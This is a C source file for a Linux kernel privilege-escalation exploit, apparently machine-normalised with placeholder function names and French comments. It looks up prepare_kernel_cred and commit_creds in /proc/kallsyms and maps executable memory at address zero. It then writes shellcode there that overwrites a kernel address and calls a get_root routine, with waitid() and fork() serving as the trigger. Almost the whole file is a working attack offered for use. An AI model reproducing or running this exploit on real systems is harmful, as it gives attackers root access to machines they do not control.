#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  siginfo_t ;
typedef  int /*<<< orphan*/  shellcode ;
typedef  scalar_t__ prepare_kernel_cred_t ;
typedef  int pid_t ;
typedef  scalar_t__ commit_creds_t ;

/* Variables and functions */
 int EXIT_FAILURE ; 
 int EXIT_SUCCESS ; 
 int MAP_ANON ; 
 int MAP_FIXED ; 
 int MAP_PRIVATE ; 
 int PROT_EXEC ; 
 int PROT_READ ; 
 int PROT_WRITE ; 
 int /*<<< orphan*/  P_PID ; 
 int WCONTINUED ; 
 int WEXITED ; 
 int WSTOPPED ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 scalar_t__ commit_creds ; 
 int FUNC1 () ; 
 scalar_t__ FUNC2 (char*) ; 
 void* get_root ; 
 int /*<<< orphan*/  FUNC3 () ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ,unsigned char*,int) ; 
 char* FUNC5 (int /*<<< orphan*/ ,int,int,int,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC6 (char*) ; 
 scalar_t__ prepare_kernel_cred ; 
 int /*<<< orphan*/  FUNC7 (char*,...) ; 
 void** FUNC8 (unsigned char*,int) ; 
 scalar_t__ FUNC9 (char*,char**,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC10 (int /*<<< orphan*/ ,int,int /*<<< orphan*/ *,int) ; 

int FUNC11(int ac, char **av)
{
	if (ac != 2) {
		FUNC7("./exploit kernel_offset\n");
		FUNC7("exemple = 0xffffffff81f3f45a");
		return EXIT_FAILURE;
	}

	// 2 - Appel de la fonction get_kernel_sym pour rcuperer dans le /proc/kallsyms les adresses des fonctions
	prepare_kernel_cred = (prepare_kernel_cred_t)FUNC2("prepare_kernel_cred");
	commit_creds = (commit_creds_t)FUNC2("commit_creds");
	// have_canfork_callback offset <= rendre dynamique aussi
	
	pid_t     pid;
	/* siginfo_t info; */

	// 1 - Mapper la mmoire  l'adresse 0x0000000000000000
	FUNC7("[+] Try to allocat 0x00000000...\n");
	if (FUNC5(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANON|MAP_PRIVATE|MAP_FIXED, -1, 0) == (char *)-1){
		FUNC7("[-] Failed to allocat 0x00000000\n");
		return -1;
	}
	FUNC7("[+] Allocation success !\n");
	/* memset(0, 0xcc, 4096); */
/*
movq rax, 0xffffffff81f3f45a
movq [rax], 0
mov rax, 0x4242424242424242
call rax
xor rax, rax
ret
replace 0x4242424242424242 by get_root
https://defuse.ca/online-x86-assembler.htm#disassembly
	 */
	unsigned char shellcode[] = 
	{ 0x48, 0xC7, 0xC0, 0x5A, 0xF4, 0xF3, 0x81, 0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0xFF, 0xD0, 0x48, 0x31, 0xC0, 0xC3 };
	void **get_root_offset = FUNC8(shellcode, 0x42);
	(*get_root_offset) = get_root;

	FUNC4(0, shellcode, sizeof(shellcode));
	/* strcpy(0, "\x48\x31\xC0\xC3"); // xor rax, rax; ret */

	if(-1 == (pid = FUNC1())) {
		FUNC6("fork()");
		return EXIT_FAILURE;
	}

	if(pid == 0) {
		FUNC0(0xDEADBEEF);
		FUNC6("son");
		return EXIT_FAILURE;
	}

	siginfo_t *ptr = (siginfo_t*)FUNC9(av[1], (char**)0, 0);
	FUNC10(P_PID, pid, ptr, WEXITED | WSTOPPED | WCONTINUED);

// TRIGGER
	pid = FUNC1();
	FUNC7("fork_ret = %d\n", pid);	
	if (pid > 0)
		FUNC3();
	return EXIT_SUCCESS;
}